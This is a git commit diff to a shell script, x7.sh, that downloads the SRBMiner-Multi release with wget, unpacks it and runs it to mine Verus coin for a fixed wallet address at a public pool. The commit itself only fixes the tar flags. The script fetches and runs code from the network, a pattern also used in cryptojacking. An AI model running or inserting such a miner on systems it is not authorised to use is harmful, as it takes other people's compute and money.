8288ea50efcbf96297dbf52cfbff6aab6901a848
marinabarros320168 <121142741+marinabarros320168@users.noreply.github.com>
2023-01-30 22:04:11 -0300

    Update x7.sh

--- x7.sh
+++ x7.sh
@@ -1,5 +1,5 @@
 # veruscoin
 wget https://github.com/doktor83/SRBMiner-Multi/releases/download/1.0.9/SRBMiner-Multi-1-0-9-Linux.tar.xz
-tar SRBMiner-Multi-1-0-9-Linux.tar.xz
+tar -xf SRBMiner-Multi-1-0-9-Linux.tar.xz
 cd SRBMiner-Multi-1-0-9
 ./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool na.luckpool.net:3957 --wallet RV15qZeZ9qggbWznCwQ8mcvfyRrhB9zEEN.rig1 --password x
